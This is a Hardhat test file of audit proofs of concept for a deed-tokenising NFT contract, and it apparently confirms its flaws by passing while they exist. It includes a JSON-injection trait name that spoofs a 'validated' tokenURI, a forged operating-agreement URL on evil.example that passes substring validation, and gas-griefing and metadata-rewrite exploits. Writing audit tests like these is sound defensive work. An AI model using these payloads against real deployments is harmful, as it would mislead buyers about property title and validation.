import { expect } from "chai";
import { ethers, upgrades } from "hardhat";
import { deployDeedTrack, mintValidatedLand, k, enc, dec, coder, Ctx, AGREEMENT_BASE, BASE_URI } from "./fixture";

/*
 * Deed-track audit PoCs: metadata integrity and validator powers.
 * Every test PASSES while the issue exists.
 */
describe("AUDIT deed: metadata integrity", function () {
  let ctx: Ctx;
  beforeEach(async () => { ctx = await deployDeedTrack(); });

  it("D-01 holder rewrites legalDescription, definition and operatingAgreement of a VALIDATED deed; it stays validated", async () => {
    const { deed, alice } = ctx;
    const id = await mintValidatedLand(ctx, alice);
    expect((await deed.getValidationStatus(id))[0]).to.equal(true);

    await deed.connect(alice).setTrait(id, ethers.toUtf8Bytes("legalDescription"), ethers.toUtf8Bytes("LOT 99, a different parcel"), 1);
    await deed.connect(alice).setTrait(id, ethers.toUtf8Bytes("parcelNumber"), ethers.toUtf8Bytes("9999-999-99"), 1);
    await deed.connect(alice).setTrait(id, ethers.toUtf8Bytes("definition"), ethers.toUtf8Bytes("Anything at all"), 1);
    await deed.connect(alice).setTrait(id, ethers.toUtf8Bytes("operatingAgreement"), ethers.toUtf8Bytes("ipfs://my-own-agreement"), 1);

    expect(dec(await deed.getTraitValue(id, k("legalDescription")))).to.equal("LOT 99, a different parcel");
    expect(dec(await deed.getTraitValue(id, k("definition")))).to.equal("Anything at all");
    // updateMetadata would have required a registered agreement name; setTrait does not.
    expect(await ctx.validator.operatingAgreementName("ipfs://my-own-agreement")).to.equal("");
    expect(dec(await deed.getTraitValue(id, k("operatingAgreement")))).to.equal("ipfs://my-own-agreement");
    const [isValidated, v] = await deed.getValidationStatus(id);
    expect(isValidated).to.equal(true);
    expect(v).to.equal(await ctx.validator.getAddress());

    // removeTrait of a required trait also leaves the deed validated
    await deed.connect(alice).removeTrait(id, "legalDescription");
    expect(await deed.getTraitValue(id, k("legalDescription"))).to.equal("0x");
    expect((await deed.getValidationStatus(id))[0]).to.equal(true);
  });

  it("D-02 a non-registry VALIDATOR_ROLE holder (deployer EOA from initialize) rewrites any holder's deed with no validation reset", async () => {
    const { deed, alice, deployer, renderer } = ctx;
    const id = await mintValidatedLand(ctx, alice);
    const VR = await deed.VALIDATOR_ROLE();
    expect(await deed.hasRole(VR, deployer.address)).to.equal(true);            // granted in initialize()
    expect(await deed.hasRole(VR, await renderer.getAddress())).to.equal(true);  // granted by setMetadataRenderer
    expect(await ctx.registry.isValidatorRegistered(deployer.address)).to.equal(false);

    await deed.connect(deployer).updateMetadata(id, "", AGREEMENT_BASE, "Definition chosen by the admin key", "");
    await deed.connect(deployer).setTrait(id, ethers.toUtf8Bytes("legalDescription"), ethers.toUtf8Bytes("ADMIN REWRITE"), 1);
    // assetType too (validator-only key)
    await deed.connect(deployer).setTrait(id, ethers.toUtf8Bytes("assetType"), coder.encode(["uint8"], [1]), 0);

    expect(dec(await deed.getTraitValue(id, k("definition")))).to.equal("Definition chosen by the admin key");
    expect(dec(await deed.getTraitValue(id, k("legalDescription")))).to.equal("ADMIN REWRITE");
    expect((await deed.getValidationStatus(id))[0]).to.equal(true);
    expect(await deed.ownerOf(id)).to.equal(alice.address);
  });

  it("D-03 any active validator overwrites another validator's deed: re-points royalties and can flip it invalid", async () => {
    const { deed, alice, operator2, registry } = ctx;
    const id = await mintValidatedLand(ctx, alice);
    const v1 = await ctx.validator.getAddress();

    const V = await ethers.getContractFactory("Validator", operator2);
    const v2: any = await upgrades.deployProxy(V, ["https://other/", "https://other/oa/"], { kind: "uups" });
    await v2.setDeedNFT(await deed.getAddress());
    await v2.setAssetTypeSupport(0, true);
    await v2.setValidationCriteria(0, ["traitNobodyHas"], "", false, false);
    await registry.registerValidator(await v2.getAddress(), "Second Validator", "", [0]);
    await registry.updateValidatorStatus(await v2.getAddress(), true);

    expect((await deed.royaltyInfo(id, 10_000n))[0]).to.equal(v1);
    await v2.connect(operator2).validateDeed(id);
    const [isValidated, v] = await deed.getValidationStatus(id);
    expect(isValidated).to.equal(false);            // v1's validated deed is now invalid
    expect(v).to.equal(await v2.getAddress());      // and names v2
    expect((await deed.royaltyInfo(id, 10_000n))[0]).to.equal(await v2.getAddress());
  });

  it("D-04 validateDeed accepts any operatingAgreement that merely CONTAINS a registered URI or baseUri", async () => {
    const { deed, alice, validator } = ctx;
    const id = await mintValidatedLand(ctx, alice);
    const evil = "https://evil.example/forged-trust.pdf?x=" + AGREEMENT_BASE;
    await deed.connect(alice).setTrait(id, ethers.toUtf8Bytes("operatingAgreement"), ethers.toUtf8Bytes(evil), 1);
    await validator.validateDeed(id);
    expect((await deed.getValidationStatus(id))[0]).to.equal(true);
    expect(dec(await deed.getTraitValue(id, k("operatingAgreement")))).to.equal(evil);
    // baseUri works the same way
    await deed.connect(alice).setTrait(id, ethers.toUtf8Bytes("operatingAgreement"), ethers.toUtf8Bytes("ipfs://x/" + BASE_URI), 1);
    await validator.validateDeed(id);
    expect((await deed.getValidationStatus(id))[0]).to.equal(true);
    // Removing the agreement's name does not stop it validating: registeredAgreementURIs is never pruned
    await deed.connect(alice).setTrait(id, ethers.toUtf8Bytes("operatingAgreement"), ethers.toUtf8Bytes(AGREEMENT_BASE + id), 1);
    await validator.removeOperatingAgreementName(AGREEMENT_BASE);
    expect(await validator.operatingAgreementName(AGREEMENT_BASE)).to.equal("");
    await validator.validateDeed(id);
    expect((await deed.getValidationStatus(id))[0]).to.equal(true);
  });

  it("D-05 trait NAME is not JSON-escaped: holder of an UNVALIDATED deed makes tokenURI show validated image/status", async () => {
    const { deed, mallory, deployer } = ctx;
    await deed.connect(deployer).mintAsset(mallory.address, 0, "ipfs://fb", "junk", "", ethers.ZeroAddress, ethers.ZeroAddress, 0);
    const id = 1n;
    expect((await deed.getValidationStatus(id))[0]).to.equal(false);

    const payload = 'X","value":"x"}],"image":"ipfs://spoofed-validated","name":"123 Main St - Land (validated)",' +
      '"attributes":[{"trait_type":"Validation Status","value":"Valid"},{"trait_type":"Z';
    await deed.connect(mallory).setTrait(id, ethers.toUtf8Bytes(payload), ethers.toUtf8Bytes("z"), 1);

    const uri: string = await deed.tokenURI(id);
    const json = JSON.parse(Buffer.from(uri.split(",")[1], "base64").toString());
    expect(json.image).to.equal("ipfs://spoofed-validated");
    expect(json.name).to.equal("123 Main St - Land (validated)");
    expect(json.attributes[0]).to.deep.equal({ trait_type: "Validation Status", value: "Valid" });
    expect(JSON.stringify(json.attributes)).to.not.contain("Invalid");
  });

  it("D-06 holder deletes recorded restrictions/documents in MetadataRenderer; validation unaffected", async () => {
    const { deed, renderer, alice, deployer } = ctx;
    const id = await mintValidatedLand(ctx, alice);
    // validator records an encumbrance and the recorded deed document
    await renderer.connect(deployer).setTokenLegalInfo(id, "CA, San Bernardino", "DOC-2026-0001", "2026-11-01",
      ["ipfs://grant-deed"], ["Deed of Trust in favour of Clear, Inst. 2026-0002"], "");
    await renderer.connect(deployer).manageTokenDocument(id, "deedOfTrust", "ipfs://dot", false);

    await renderer.connect(alice).setTokenLegalInfo(id, "CA, San Bernardino", "DOC-2026-0001", "2026-11-01", [], [], "clean title");
    await renderer.connect(alice).manageTokenDocument(id, "deedOfTrust", "", true);

    const info = await renderer.getTokenLegalInfo(id);
    expect(info.restrictions.length).to.equal(0);
    expect(await renderer.getTokenDocument(id, "deedOfTrust")).to.equal("");
    expect((await deed.getValidationStatus(id))[0]).to.equal(true);
  });

  it("D-07 owner updateMetadata writes validator=address(0): royaltyInfo and every later updateMetadata revert", async () => {
    const { deed, alice, deployer } = ctx;
    const id = await mintValidatedLand(ctx, alice);
    await deed.connect(alice).updateMetadata(id, "", AGREEMENT_BASE, "new def", "");
    await expect(deed.royaltyInfo(id, 1000n)).to.be.revertedWith("Invalid validator address");
    await expect(deed.connect(alice).updateMetadata(id, "", AGREEMENT_BASE, "again", "")).to.be.revertedWith("No validator available");
    await expect(deed.connect(deployer).updateMetadata(id, "", AGREEMENT_BASE, "validator fix", "")).to.be.revertedWith("No validator available");
  });

  it("D-08 any holder grows the GLOBAL _allTraitKeys array: every other holder's burn gets more expensive, permanently", async () => {
    const { deed, alice, mallory, deployer } = ctx;
    const victim = await mintValidatedLand(ctx, alice);
    await deed.connect(deployer).mintAsset(mallory.address, 0, "", "m", "", ethers.ZeroAddress, ethers.ZeroAddress, 0);
    const mid = 2n;
    const before = await deed.connect(alice).burnAsset.estimateGas(victim);
    for (let i = 0; i < 150; i++) {
      await deed.connect(mallory).setTrait(mid, ethers.toUtf8Bytes("junk" + i), ethers.toUtf8Bytes("x"), 1);
    }
    const after = await deed.connect(alice).burnAsset.estimateGas(victim);
    const perKey = (after - before) / 150n;
    console.log(`      burnAsset gas: ${before} -> ${after} (+${perKey}/key added by another holder)`);
    expect(perKey).to.be.greaterThan(2000n);
    // getTraitKeys (used by tokenURI) also scans every global key for every token
    expect((await deed.getTraitKeys(victim)).length).to.equal(12); // unaffected result, but O(global keys) cost
  });
});
